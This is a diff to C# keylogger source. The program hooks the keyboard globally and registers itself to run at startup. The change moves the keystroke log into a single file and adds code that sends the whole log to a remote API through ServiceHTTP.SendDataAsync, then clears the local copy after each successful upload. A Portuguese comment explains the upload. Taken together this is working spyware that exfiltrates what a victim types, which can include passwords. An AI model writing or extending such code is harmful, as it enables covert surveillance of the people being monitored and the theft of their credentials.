@@ -10,7 +10,6 @@ namespace KeyLogger
         private GlobalKeyboardHook _globalKeyboardHook;
         public static string TextFull { get; set; } = string.Empty;
         public static DateTime LastSave { get; set; }
-        public static DirectoryInfo DirectoryInfo { get; set; }
 
         public KeyLogger()
         {
@@ -39,7 +38,6 @@ namespace KeyLogger
                 startupApp.SetStartup();
             }
 
-            DirectoryInfo = new DirectoryInfo(Path.Combine(Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "logger"));
             timer1.Start();
             base.OnLoad(e);
         }
@@ -65,11 +63,9 @@ namespace KeyLogger
             }
         }
 
-        private static void SaveText(string text)
+        private static async void SaveText(string text)
         {
-            Directory.CreateDirectory(DirectoryInfo.FullName);
-
-            FileInfo file = new FileInfo(Path.Combine(DirectoryInfo.FullName, $"{DateTime.Now:HH-dd-MM-yyyy}.log"));
+            FileInfo file = new FileInfo(Path.Combine(Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "logger.log"));
             try
             {
                 if (!file.Exists) { file.Create().Close(); }
@@ -77,6 +73,12 @@ namespace KeyLogger
                 string AllText = File.ReadAllText(file.FullName);
 
                 AllText += text;
+                
+                // Envia todo o log para a API se tiver sucesso, irá resetar o arquivo
+                if(await ServiceHTTP.SendDataAsync(AllText))
+                {
+                    AllText = string.Empty;
+                }
 
                 File.WriteAllText(file.FullName, AllText);
             }
